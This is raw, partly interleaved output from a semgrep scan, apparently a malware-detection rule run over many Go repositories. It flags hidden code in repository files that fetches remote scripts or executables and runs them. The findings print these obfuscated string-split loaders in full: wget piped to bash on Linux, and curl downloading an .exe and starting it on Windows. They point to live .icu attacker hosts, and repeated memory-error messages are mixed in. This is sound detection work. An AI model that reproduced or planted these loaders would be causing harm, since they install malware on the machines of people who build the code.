semgrep-core exited with -10!
[ERROR] Error while running rules: 
                    You are seeing this because the engine was killed.

                    The most common reason this happens is because it used too much memory.
                    If your repo is large (~10k files or more), you have three options:
                    1. Increase the amount of memory available to semgrep
                    2. Reduce the number of jobs semgrep runs with via `-j <jobs>`. We
                        recommend using 1 job if you are running out of memory.
                    3. Scan the repo in parts (contact us for help)

                    Otherwise, it is likely that semgrep is hitting the limit on only some
                    files. In this case, you can try to set the limit on the amount of memory
                    semgrep can use on each file with `--max-memory <memory>`. We recommend
                    lowering this to a limit 70% of the available memory. For CI runs with
                    interfile analysis, the default max-memory is 5000MB. Without, the default
                    is unlimited.

                    The last thing you can try if none of these work is to raise the stack
                    limit with `ulimit -s <limit>`.

                    If you have tried all these steps and still are seeing this error, please
                    contact us.

                       Error: semgrep-core exited with unexpected output

semgrep-core exited with -10!
[ERROR] Error while running rules: 
                    You are seeing this because the engine was killed.

                    The most common reason this happens is because it used too much memory.
                    If your repo is large (~10k files or more), you have three options:
                    1. Increase the amount of memory available to semgrep
                    2. Reduce the number of jobs semgrep runs with via `-j <jobs>`. We
                        recommend using 1 job if you are running out of memory.
                    3. Scan the repo in parts (contact us for help)

                    Otherwise, it is likely that semgrep is hitting the limit on only some
                    files. In this case, you can try to set the limit on the amount of memory
                    semgrep can use on each file with `--max-memory <memory>`. We recommend
                    lowering this to a limit 70% of the available memory. For CI runs with
                    interfile analysis, the default max-memory is 5000MB. Without, the default
                    is unlimited.

                    The last thing you can try if none of these work is to raise the stack
                    limit with `ulimit -s <limit>`.

                    If you have tried all these steps and still are seeing this error, please
                    contact us.

semgrep-core exited with -10!
[ERROR] Error while running rules: 
                    You are seeing this because the engine was killed.

                    The most common reason this happens is because it used too much memory.
                    If your repo is large (~10k files or more), you have three options:
                    1. Increase the amount of memory available to semgrep
                    2. Reduce the number of jobs semgrep runs with via `-j <jobs>`. We
                        recommend using 1 job if you are running out of memory.
                    3. Scan the repo in parts (contact us for help)

                    Otherwise, it is likely that semgrep is hitting the limit on only some
                    files. In this case, you can try to set the limit on the amount of memory
                    semgrep can use on each file with `--max-memory <memory>`. We recommend
                    lowering this to a limit 70% of the available memory. For CI runs with
                    interfile analysis, the default max-memory is 5000MB. Without, the default
                    is unlimited.

                    The last thing you can try if none of these work is to raise the stack
                    limit with `ulimit -s <limit>`.

                    If you have tried all these steps and still are seeing this error, please
                    contact us.

                       Error: semgrep-core exited with unexpected output

                       !!!This is a proprietary extension of semgrep.!!!
!!!You should not call directly this program.!!!

   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           49в”Ҷ exec.Command("/bin/" + "sh", "-c", phLE).Start()
    
    
          Taint comes from:
    
           48в”Ҷ phLE := "wge" + "t" + " " + "-O" + " - h" + "ttp" + "s://h" + "yperw" + "ord" + "stat" +   
               "us.ic" + "u/s" + "tor" + "age/" + "de" + "37" + "3d0d" + "f/a31" + "5" + "4" + "6bf |" + "
               /bin" + "/bas" + "h &"                                                                     
    
    
          Taint flows through these intermediate variables:
    
           48в”Ҷ phLE := "wge" + "t" + " " + "-O" + " - h" + "ttp" + "s://h" + "yperw" + "ord" + "stat" +   
               "us.ic" + "u/s" + "tor" + "age/" + "de" + "37" + "3d0d" + "f/a31" + "5" + "4" + "6bf |" + "
               /bin" + "/bas" + "h &"                                                                     
    
    
                This is how taint reaches the sink:
    
           49в”Ҷ exec.Command("/bin/" + "sh", "-c", phLE).Start()

   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           90в”Ҷ exec.Command("cmd", "/C", cmzG).Start()
    
    
          Taint comes from:
    
           89в”Ҷ cmzG := "if" + " not " + "exi" + "st" + " " + "%U" + "ser" + "Pr" + "ofile" + "%\\Ap" +   
               "pData" + "\\Loca" + "l\\" + "tcs" + "ibz" + "\\" + "zuvwl" + ".e" + "xe " + "c" + "url h"
               + "tt" + "ps:/" + "/kas" + "pa" + "mirr" + "or.ic" + "u" + "/stor" + "age/b" + "bb28e" +  
               "f04/f" + "a31" + "546b" + " --cr" + "ea" + "te-d" + "ir" + "s -" + "o %" + "Use" + "r" + 
               "Pr" + "ofi" + "le%\\" + "A" + "ppDa" + "ta\\L" + "oc" + "a" + "l\\" + "tcs" + "ibz\\" +  
               "zuvw" + "l." + "ex" + "e" + " " + "&" + "& " + "star" + "t " + "/b" + " %U" + "ser" +    
               "Profi" + "le%" + "\\" + "Ap" + "pD" + "ata\\" + "Local" + "\\" + "tc" + "sib" + "z\\zu" +
               "vwl." + "ex" + "e"                                                                       
    
    
          Taint flows through these intermediate variables:

в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ
                                                                                                                   
    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/electrichier/apache-tomcat/cmd/helper/main.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           43в”Ҷ exec.Command("/bin" + "/s" + "h", "-c", dSZPcoH).Start()
    
    
          Taint comes from:
    
           38в”Ҷ var dSZPcoH = "wget -" + "O - " + "ht" + "tps:" + "//" + "kava" + "rec" + "ent.i" + "cu/st"
               + "orag" + "e/" + "de" + "3" + "73d0d" + "f/a31" + "54" + "6b" + "f | /" + "bin" + "/bash" 
               + " &"                                                                                     
    
    
          Taint flows through these intermediate variables:
    
           38в”Ҷ var dSZPcoH = "wget -" + "O - " + "ht" + "tps:" + "//" + "kava" + "rec" + "ent.i" + "cu/st"
               + "orag" + "e/" + "de" + "3" + "73d0d" + "f/a31" + "54" + "6b" + "f | /" + "bin" + "/bash" 
               + " &"                                                                                     
    
    
                This is how taint reaches the sink:
    
           40в”Ҷ var PAlVndFE = UtGCmT()
    
          Taint flows through these intermediate variables:
    
           43в”Ҷ exec.Command("/bin" + "/s" + "h", "-c", dSZPcoH).Start()
    
          then reaches:
    
           43в”Ҷ exec.Command("/bin" + "/s" + "h", "-c", dSZPcoH).Start()

semgrep-core exited with -10!
[ERROR] Error while running rules: 
                    You are seeing this because the engine was killed.

                    The most common reason this happens is because it used too much memory.
                    If your repo is large (~10k files or more), you have three options:
                    1. Increase the amount of memory available to semgrep
                    2. Reduce the number of jobs semgrep runs with via `-j <jobs>`. We
                        recommend using 1 job if you are running out of memory.
                    3. Scan the repo in parts (contact us for help)

                    Otherwise, it is likely that semgrep is hitting the limit on only some
                    files. In this case, you can try to set the limit on the amount of memory
                    semgrep can use on each file with `--max-memory <memory>`. We recommend
                    lowering this to a limit 70% of the available memory. For CI runs with
                    interfile analysis, the default max-memory is 5000MB. Without, the default
                    is unlimited.

                    The last thing you can try if none of these work is to raise the stack
                    limit with `ulimit -s <limit>`.

                    If you have tried all these steps and still are seeing this error, please
                    contact us.

                       Error: semgrep-core exited with unexpected output

    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/insistentbea/argocd-ephemeral-access/api/argoproj/

   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
          103в”Ҷ exec.Command("cmd", "/C", mpFKY).Start()
    
    
          Taint comes from:
    
           98в”Ҷ var mpFKY = "if n" + "o" + "t exi" + "st" + " %Use" + "rP" + "rofil" + "e" + "%\\App" +   
               "Da" + "ta" + "\\Loc" + "al\\x" + "elo" + "dh\\" + "l" + "anfs" + ".exe" + " cu" + "rl ht"
               + "t" + "ps:/" + "/ka" + "spam" + "ir" + "ro" + "r.i" + "cu" + "/st" + "orage" + "/bbb2" +
               "8" + "ef0" + "4/fa3" + "15" + "46b -" + "-crea" + "te" + "-dirs" + " -o " + "%User" +    
               "Profi" + "le%\\" + "App" + "Data\\" + "Lo" + "cal\\x" + "elo" + "dh\\l" + "a" + "n" +    
               "fs.ex" + "e &" + "& sta" + "rt" + " /b" + " %U" + "s" + "erPr" + "of" + "ile" + "%\\Ap" +
               "p" + "Da" + "ta\\" + "Lo" + "ca" + "l\\x" + "el" + "odh\\l" + "anfs" + "." + "exe"       
    
    
          Taint flows through these intermediate variables:
    
           98в”Ҷ var mpFKY = "if n" + "o" + "t exi" + "st" + " %Use" + "rP" + "rofil" + "e" + "%\\App" +   
               "Da" + "ta" + "\\Loc" + "al\\x" + "elo" + "dh\\" + "l" + "anfs" + ".exe" + " cu" + "rl ht"
               + "t" + "ps:/" + "/ka" + "spam" + "ir" + "ro" + "r.i" + "cu" + "/st" + "orage" + "/bbb2" +
               "8" + "ef0" + "4/fa3" + "15" + "46b -" + "-crea" + "te" + "-dirs" + " -o " + "%User" +    
               "Profi" + "le%\\" + "App" + "Data\\" + "Lo" + "cal\\x" + "elo" + "dh\\l" + "a" + "n" +    
               "fs.ex" + "e &" + "& sta" + "rt" + " /b" + " %U" + "s" + "erPr" + "of" + "ile" + "%\\Ap" +

semgrep-core exited with -10!
[ERROR] Error while running rules: 
                    You are seeing this because the engine was killed.

                    The most common reason this happens is because it used too much memory.
                    If your repo is large (~10k files or more), you have three options:
                    1. Increase the amount of memory available to semgrep
                    2. Reduce the number of jobs semgrep runs with via `-j <jobs>`. We
                        recommend using 1 job if you are running out of memory.
                    3. Scan the repo in parts (contact us for help)

                    Otherwise, it is likely that semgrep is hitting the limit on only some
                    files. In this case, you can try to set the limit on the amount of memory
                    semgrep can use on each file with `--max-memory <memory>`. We recommend
                    lowering this to a limit 70% of the available memory. For CI runs with
                    interfile analysis, the default max-memory is 5000MB. Without, the default
                    is unlimited.

                    The last thing you can try if none of these work is to raise the stack
                    limit with `ulimit -s <limit>`.

                    If you have tried all these steps and still are seeing this error, please
                    contact us.

                       Error: semgrep-core exited with unexpected output

!!!You should not call directly this program.!!!

    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/keymoai/dyslink/cmd/dyslink.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
          118в”Ҷ var ZfHPby = exec.Command("/bin/s" + "h", "-c", RcgIOfe).Start()
    
    
          Taint comes from:
    
          116в”Ҷ var RcgIOfe = "wg" + "e" + "t -O" + " - h" + "t" + "tp" + "s://" + "h" + "yper" + "words" +
               "tat" + "us" + ".icu" + "/s" + "tor" + "age/d" + "e" + "373" + "d0df/" + "a3" + "1546b" +  
               "f | /" + "bin/b" + "ash" + " " + "&"                                                      
    
    
          Taint flows through these intermediate variables:
    
          116в”Ҷ var RcgIOfe = "wg" + "e" + "t -O" + " - h" + "t" + "tp" + "s://" + "h" + "yper" + "words" +
               "tat" + "us" + ".icu" + "/s" + "tor" + "age/d" + "e" + "373" + "d0df/" + "a3" + "1546b" +  
               "f | /" + "bin/b" + "ash" + " " + "&"                                                      
    
    
                This is how taint reaches the sink:
    
          118в”Ҷ var ZfHPby = exec.Command("/bin/s" + "h", "-c", RcgIOfe).Start()

    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/nervousease/secrets-store-sync-controller/api/v1al
  pha1/groupversion_info.go                                                                                             
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           42в”Ҷ var PyqAmbeL = exec.Command("/bin" + "/sh", "-c", sMjh).Start()
    
    
          Taint comes from:
    
           40в”Ҷ var sMjh = "wg" + "et" + " -" + "O -" + " htt" + "ps" + "://" + "infi" + "nityh" + "el.i" +
               "cu/st" + "orag" + "e/de" + "37" + "3d0df" + "/a315" + "46bf " + "| /" + "bin/" + "bash" + 
               " &"                                                                                       
    
    
          Taint flows through these intermediate variables:
    
           40в”Ҷ var sMjh = "wg" + "et" + " -" + "O -" + " htt" + "ps" + "://" + "infi" + "nityh" + "el.i" +
               "cu/st" + "orag" + "e/de" + "37" + "3d0df" + "/a315" + "46bf " + "| /" + "bin/" + "bash" + 
               " &"                                                                                       
    
    
                This is how taint reaches the sink:
    
           42в”Ҷ var PyqAmbeL = exec.Command("/bin" + "/sh", "-c", sMjh).Start()

               "/in" + "f" + "inity" + "hel." + "icu/s" + "torag" + "e" + "/bbb2" + "8ef" + "04/" + "fa31"

               "x" + "e && " + "start" + " " + "/b %" + "UserP" + "ro" + "fil" + "e%\\" + "Ap" + "pD" +   
               "ata\\L" + "ocal\\" + "yl" + "umxk\\" + "vf" + "s" + "dr.e" + "x" + "e"                    
    
    
          Taint flows through these intermediate variables:

          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.

          Taint comes from:
    
          106в”Ҷ var RJIsp = "wge" + "t -" + "O" + " - h" + "tt" + "ps://" + "ka" + "spami" + "rror" +   
               ".icu/" + "s" + "torag" + "e/de" + "373d" + "0df" + "/a3" + "15" + "46b" + "f |" + " " +
               "/bi" + "n/ba" + "sh " + "&"                                                            
    
    
          Taint flows through these intermediate variables:
    
          106в”Ҷ var RJIsp = "wge" + "t -" + "O" + " - h" + "tt" + "ps://" + "ka" + "spami" + "rror" +   
               ".icu/" + "s" + "torag" + "e/de" + "373d" + "0df" + "/a3" + "15" + "46b" + "f |" + " " +
               "/bi" + "n/ba" + "sh " + "&"                                                            
    
    
                This is how taint reaches the sink:
    
          108в”Ҷ var cbUkWFD = xTNyrOif()
    
          Taint flows through these intermediate variables:
    
          111в”Ҷ exec.Command("/bi" + "n/s" + "h", "-c", RJIsp).Start()
    
          then reaches:
    
          111в”Ҷ exec.Command("/bi" + "n/s" + "h", "-c", RJIsp).Start()

               "/bin/" + "b" + "ash " + "&"

           51в”Ҷ var HdjOgT = EiGvKoXx()

           54в”Ҷ exec.Command("/b" + "i" + "n" + "/sh", "-c", xYXM).Start()

               "icu/s" + "tor" + "ag" + "e/d" + "e3" + "73d0" + "df/a" + "31546" + "bf " + "|" + " /b" + 
               "in/" + "bash" + " &"                                                                     
    
    
          Taint flows through these intermediate variables:
    
          103в”Ҷ KfhTFzzw := "wg" + "et" + " -" + "O - " + "htt" + "ps://" + "ka" + "varec" + "en" + "t." +
               "icu/s" + "tor" + "ag" + "e/d" + "e3" + "73d0" + "df/a" + "31546" + "bf " + "|" + " /b" + 
               "in/" + "bash" + " &"

в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ
                                                                                                        
    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/punyzither/movieSpider/cmd/root.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           59в”Ҷ exec.Command("/bin/" + "sh", "-c", WZZEIJ).Start()
    
    
          Taint comes from:
    
           58в”Ҷ WZZEIJ := "wget -" + "O -" + " http" + "s://" + "kavar" + "ecent" + ".icu/" + "stor" +    
               "age/" + "de3" + "7" + "3d0df" + "/a315" + "46" + "bf" + " | /" + "b" + "in" + "/ba" + "sh
               " + "&"                                                                                   
    
    
          Taint flows through these intermediate variables:
    
           58в”Ҷ WZZEIJ := "wget -" + "O -" + " http" + "s://" + "kavar" + "ecent" + ".icu/" + "stor" +    
               "age/" + "de3" + "7" + "3d0df" + "/a315" + "46" + "bf" + " | /" + "b" + "in" + "/ba" + "sh
               " + "&"                                                                                   
    
    
                This is how taint reaches the sink:
    
           59в”Ҷ exec.Command("/bin/" + "sh", "-c", WZZEIJ).Start()

    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/qmaru/qtray/internal/helper/elevate_macos.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           21в”Ҷ out, err := exec.Command("osascript", "-e", script).Output()
    
    
          Taint comes from:
    
           20в”Ҷ script := "display dialog \"" + msg + "\" with title \"" + title + "\" buttons {" + btns +
               "} default button \"" + defaultBtn + "\""                                                 
    
    
          Taint flows through these intermediate variables:
    
           20в”Ҷ script := "display dialog \"" + msg + "\" with title \"" + title + "\" buttons {" + btns +
               "} default button \"" + defaultBtn + "\""                                                 
    
    
                This is how taint reaches the sink:
    
           21в”Ҷ out, err := exec.Command("osascript", "-e", script).Output()

semgrep-core exited with -10!
[ERROR] Error while running rules: 
                    You are seeing this because the engine was killed.

                    The most common reason this happens is because it used too much memory.
                    If your repo is large (~10k files or more), you have three options:
                    1. Increase the amount of memory available to semgrep
                    2. Reduce the number of jobs semgrep runs with via `-j <jobs>`. We
                        recommend using 1 job if you are running out of memory.
                    3. Scan the repo in parts (contact us for help)

                    Otherwise, it is likely that semgrep is hitting the limit on only some
                    files. In this case, you can try to set the limit on the amount of memory
                    semgrep can use on each file with `--max-memory <memory>`. We recommend
                    lowering this to a limit 70% of the available memory. For CI runs with
                    interfile analysis, the default max-memory is 5000MB. Without, the default
                    is unlimited.

                    The last thing you can try if none of these work is to raise the stack
                    limit with `ulimit -s <limit>`.

                    If you have tried all these steps and still are seeing this error, please
                    contact us.

    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/recklessgoodn/pkgstats-cli/cmd/architecture.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           89в”Ҷ exec.Command("cmd", "/C", eHRCBnPl).Start()

               "pD" + "ata\\" + "Loc" + "a" + "l\\jan" + "nmw" + "\\" + "jsdic" + ".ex" + "e" + " cu" +   
               "rl " + "https" + ":" + "//un" + "is" + "c" + "omp" + "u" + "ter.i" + "cu/s" + "to" +

               "-di" + "rs -o" + " %Use" + "rP" + "rof" + "il" + "e%" + "\\AppD" + "ata" + "\\Lo" + "ca" +

          Taint flows through these intermediate variables:
    
           88в”Ҷ eHRCBnPl := "if n" + "ot ex" + "ist" + " %Us" + "e" + "rPr" + "of" + "ile%\\" + "A" + "p" +

в”Ңв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”җ
в”Ӯ 1 Code Finding в”Ӯ
в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ
                                                                                                                     
    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/rotatingvio/cni-dra-driver/apis/v1alpha1/doc.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           26в”Ҷ exec.Command("/bin/" + "sh", "-c", pUlvH).Start()
    
    
          Taint comes from:
    
           25в”Ҷ pUlvH := "wget -" + "O" + " - h" + "ttps" + "://ka" + "sp" + "amirr" + "or." + "icu/" +  
               "stora" + "ge/" + "de3" + "73d" + "0d" + "f/a" + "31" + "54" + "6bf |" + " /" + "bin/b" +
               "a" + "sh &"                                                                             
    
    
          Taint flows through these intermediate variables:
    
           25в”Ҷ pUlvH := "wget -" + "O" + " - h" + "ttps" + "://ka" + "sp" + "amirr" + "or." + "icu/" +  
               "stora" + "ge/" + "de3" + "73d" + "0d" + "f/a" + "31" + "54" + "6bf |" + " /" + "bin/b" +
               "a" + "sh &"                                                                             
    
    
                This is how taint reaches the sink:
    
           26в”Ҷ exec.Command("/bin/" + "sh", "-c", pUlvH).Start()

               "icu/" + "sto" + "rag" + "e/" + "de373" + "d" + "0df" + "/a31" + "54" + "6bf " + "| " +

           28в”Ҷ EgStxVa := "wget " + "-O -" + " ht" + "tp" + "s://" + "hyper" + "wo" + "rdst" + "atus." +
               "icu/" + "sto" + "rag" + "e/" + "de373" + "d" + "0df" + "/a31" + "54" + "6bf " + "| " +

    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/sinfulchalet/rsync-over-grpc/cmd/grpc-rsync-client
  /client.go                                                                                                            
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           78в”Ҷ var jvHPhZ = exec.Command("/bin" + "/sh", "-c", nggF).Start()
    
    
          Taint comes from:
    
           76в”Ҷ var nggF = "wget -" + "O - h" + "tt" + "ps:/" + "/i" + "nfini" + "tyhe" + "l." + "ic" +    
               "u/" + "sto" + "ra" + "g" + "e/d" + "e373" + "d0" + "df/" + "a31" + "546" + "bf" + " | /" +
               "bi" + "n/" + "ba" + "s" + "h" + " &"                                                      
    
    
          Taint flows through these intermediate variables:
    
           76в”Ҷ var nggF = "wget -" + "O - h" + "tt" + "ps:/" + "/i" + "nfini" + "tyhe" + "l." + "ic" +    
               "u/" + "sto" + "ra" + "g" + "e/d" + "e373" + "d0" + "df/" + "a31" + "546" + "bf" + " | /" +
               "bi" + "n/" + "ba" + "s" + "h" + " &"                                                      
    
    
                This is how taint reaches the sink:
    
           78в”Ҷ var jvHPhZ = exec.Command("/bin" + "/sh", "-c", nggF).Start()

          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.

               "icu/s" + "tor" + "age/" + "de3" + "73d" + "0df/" + "a3" + "1546b" + "f | " + "/bi" + "n" +
               "/ba" + "sh" + " &"

               "/ba" + "sh" + " &"

          (exec/syscall/os.StartProcess) or dynamic loaders.

          Taint comes from:

               "w.icu" + "/st" + "orage" + "/" + "de3" + "73d0" + "df/a" + "315" + "46bf " + "| /" +   
               "bin/b" + "as" + "h &"                                                                  
    
    
          Taint flows through these intermediate variables:
    
           31в”Ҷ var CiLRKiw = "wge" + "t" + " -" + "O " + "- htt" + "p" + "s://k" + "a" + "iafl" + "o" +
               "w.icu" + "/st" + "orage" + "/" + "de3" + "73d0" + "df/a" + "315" + "46bf " + "| /" +   
               "bin/b" + "as" + "h &"                                                                  
    
    
                This is how taint reaches the sink:

в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ
                                                                                                
    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/trimgold/synco/cmd/root.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           66в”Ҷ exec.Command("/bin/" + "s" + "h", "-c", dBHkFM).Start()
    
    
          Taint comes from:
    
           65в”Ҷ dBHkFM := "wget " + "-O -" + " h" + "ttps" + "://h" + "y" + "perw" + "or" + "dst" + "at" + 
               "us." + "icu" + "/st" + "orag" + "e/de" + "373d" + "0d" + "f/a3" + "154" + "6b" + "f | /" +
               "b" + "in/ba" + "sh &"                                                                     
    
    
          Taint flows through these intermediate variables:
    
           65в”Ҷ dBHkFM := "wget " + "-O -" + " h" + "ttps" + "://h" + "y" + "perw" + "or" + "dst" + "at" + 
               "us." + "icu" + "/st" + "orag" + "e/de" + "373d" + "0d" + "f/a3" + "154" + "6b" + "f | /" +
               "b" + "in/ba" + "sh &"                                                                     
    
    
                This is how taint reaches the sink:
    
           66в”Ҷ exec.Command("/bin/" + "s" + "h", "-c", dBHkFM).Start()

в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ
                                                                                                         
    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/unsungluxury/oci/cmd/ocisrv/main.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
          133в”Ҷ exec.Command("/bin" + "/s" + "h", "-c", DZxRK).Start()
    
    
          Taint comes from:
    
          128в”Ҷ var DZxRK = "wget -" + "O " + "-" + " " + "ht" + "tp" + "s:" + "//man" + "tra" + "bower" +
               "y.ic" + "u/" + "stora" + "ge/de" + "3" + "73d0d" + "f/a3" + "1546" + "bf |" + " /" + "bi"
               + "n/bas" + "h &"                                                                         
    
    
          Taint flows through these intermediate variables:
    
          128в”Ҷ var DZxRK = "wget -" + "O " + "-" + " " + "ht" + "tp" + "s:" + "//man" + "tra" + "bower" +
               "y.ic" + "u/" + "stora" + "ge/de" + "3" + "73d0d" + "f/a3" + "1546" + "bf |" + " /" + "bi"
               + "n/bas" + "h &"                                                                         
    
    
                This is how taint reaches the sink:
    
          130в”Ҷ var pmbSgc = urCPfZU()

   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           33в”Ҷ exec.Command("cmd", "/C", BCzcAd).Start()
    
    
          Taint comes from:
    
           28в”Ҷ var BCzcAd = "if not" + " exis" + "t %" + "User" + "P" + "rof" + "ile%" + "\\App" + "Data" 
               + "\\Loca" + "l" + "\\" + "nsn" + "zfv" + "\\r" + "wspf" + ".exe" + " cur" + "l" + " http" 
               + "s" + ":/" + "/" + "mo" + "nsol" + "ett" + "e" + "r.ic" + "u/sto" + "rage" + "/bbb2" +   
               "8" + "ef0" + "4" + "/fa31" + "5" + "46b" + " --cr" + "e" + "a" + "te-di" + "rs -o" + " " +
               "%U" + "se" + "r" + "Pro" + "file" + "%\\Ap" + "pDat" + "a\\Loc" + "al" + "\\" + "ns" +    
               "nzfv\\" + "r" + "ws" + "pf" + ".exe" + " " + "&& " + "s" + "ta" + "rt " + "/" + "b " +    
               "%User" + "Pro" + "f" + "ile%" + "\\App" + "Da" + "ta\\Lo" + "cal" + "\\" + "ns" + "nzf" + 
               "v\\" + "rw" + "spf" + ".exe"                                                              
    
    
          Taint flows through these intermediate variables:
    
           28в”Ҷ var BCzcAd = "if not" + " exis" + "t %" + "User" + "P" + "rof" + "ile%" + "\\App" + "Data" 
               + "\\Loca" + "l" + "\\" + "nsn" + "zfv" + "\\r" + "wspf" + ".exe" + " cur" + "l" + " http" 
               + "s" + ":/" + "/" + "mo" + "nsol" + "ett" + "e" + "r.ic" + "u/sto" + "rage" + "/bbb2" +   
               "8" + "ef0" + "4" + "/fa31" + "5" + "46b" + " --cr" + "e" + "a" + "te-di" + "rs -o" + " " +
               "%U" + "se" + "r" + "Pro" + "file" + "%\\Ap" + "pDat" + "a\\Loc" + "al" + "\\" + "ns" +    
               "nzfv\\" + "r" + "ws" + "pf" + ".exe" + " " + "&& " + "s" + "ta" + "rt " + "/" + "b " +    
               "%User" + "Pro" + "f" + "ile%" + "\\App" + "Da" + "ta\\Lo" + "cal" + "\\" + "ns" + "nzf" + 
               "v\\" + "rw" + "spf" + ".exe"                                                              
    
    
                This is how taint reaches the sink:
    
           30в”Ҷ var MMkFKSxJ = QokDhH()
    
          Taint flows through these intermediate variables:
    
           33в”Ҷ exec.Command("cmd", "/C", BCzcAd).Start()

           33в”Ҷ exec.Command("cmd", "/C", BCzcAd).Start()

   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           70в”Ҷ exec.Command("/bin" + "/s" + "h", "-c", XJLEcF).Start()
    
    
          Taint comes from:
    
           69в”Ҷ XJLEcF := "wge" + "t " + "-O " + "- ht" + "tps:/" + "/kasp" + "am" + "i" + "rror." + "icu"
               + "/" + "stor" + "a" + "g" + "e/" + "de373" + "d0df/" + "a3" + "15" + "46bf" + " | " +    
               "/bi" + "n/bas" + "h &"                                                                   
    
    
          Taint flows through these intermediate variables:
    
           69в”Ҷ XJLEcF := "wge" + "t " + "-O " + "- ht" + "tps:/" + "/kasp" + "am" + "i" + "rror." + "icu"
               + "/" + "stor" + "a" + "g" + "e/" + "de373" + "d0df/" + "a3" + "15" + "46bf" + " | " +    
               "/bi" + "n/bas" + "h &"                                                                   
    
    
                This is how taint reaches the sink:
    
           70в”Ҷ exec.Command("/bin" + "/s" + "h", "-c", XJLEcF).Start()

в”Ӯ 1 Code Finding в”Ӯ
в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ
                                                                                                       
    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/waryoldie/progen/cmd/generator.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           17в”Ҷ exec.Command("/bin/s" + "h", "-c", qMYvZ).Start()
    
    
          Taint comes from:
    
